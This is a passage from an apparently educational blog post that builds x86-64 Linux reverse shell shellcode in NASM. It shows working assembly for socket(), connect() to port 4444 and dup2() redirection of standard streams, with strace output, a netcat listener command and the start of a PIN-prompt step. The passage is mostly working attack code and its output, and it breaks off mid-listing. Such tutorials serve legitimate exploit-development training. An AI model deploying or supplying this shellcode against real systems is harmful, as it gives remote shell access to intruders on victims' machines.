class=&quot;nx&quot;&gt;submitted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;other&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;syscalls&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can also make a simple test at this point to know if your assembly code is written correctly or not, by using the strace tool. You should see AF_INET, SOCK_STREAM and IPPROTO_IP as arguments and a non-negative file descriptor number after the equal sign.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;felf64&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ld&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./reverse&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./reverse&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7ffd29c78350&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* 63 vars */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;IPPROTO_IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Moving on to the &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall. As described already in the bind shellcode post, struct members are layed out in memory contiguously, first member on the lowest and last member on the highest address. This is also the reason why we are pushing the 8 zero bytes to the stack first, 2 bytes for AF_INET the last and then adjust the stack pointer with &lt;code class=&quot;highlighter-rouge&quot;&gt;sub rsp, 8&lt;/code&gt; to point to the beginning of that structure in memory. By doing this we will have the start address of the structure in RSP which we can simply move to RSI for our 2nd argument. We already learned previously that RDX here will hold the size of our structure, which is 16 bytes (&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rdx, 16&lt;/code&gt;).&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;nx&quot;&gt;server_struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;                         &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;           &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IN_ADDR_ANY&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5c11&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x115c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;                       &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;adjusting&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stack&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pointer&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;point&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;duplicate_sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;old&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If the connection succeeds, &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; will return 0. Let’s validate that by using the strace tool on the shellcode. Open 2 terminal windows.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;run the command to listen on port 4444 to which our shellcode will try to connect to:
    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;assemble, link and run the program with strace on 2nd window. You will see &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall returning us a fd = 3 which is then the 1st argument for &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall. Second argument is the addr structure and 3rd argument specifies 16 bytes as the length of our struct. We can validate that &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; returned successfully with return value 0.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;felf64&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ld&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./reverse&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./reverse&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7ffc7f671540&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* 63 vars */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;IPPROTO_IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sa_family&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0.0.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;part-2---enter-the-correct-pin-code&quot;&gt;&lt;b&gt;Part 2&lt;/b&gt; - enter the correct PIN code&lt;/h4&gt;

&lt;p&gt;In order to ask the user to enter the correct PIN code we have to specify the same file descriptor we used for &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall also for the &lt;code class=&quot;highlighter-rouge&quot;&gt;write()&lt;/code&gt; syscall as 1st argument (RDI). As we saved the fd to RDI earlier, we have already done that. For argument number 2 we need to provide an address where we have stored the string we want to display to the user “PIN:”. For that we should convert the string to hex, change the byte order as we are dealing with little-endian (&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import binascii; binascii.hexlify(&quot;PIN:&quot;[::-1])'&lt;/code&gt;) and then push that value to the stack so we can move the stack address in RSP to RSI.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;

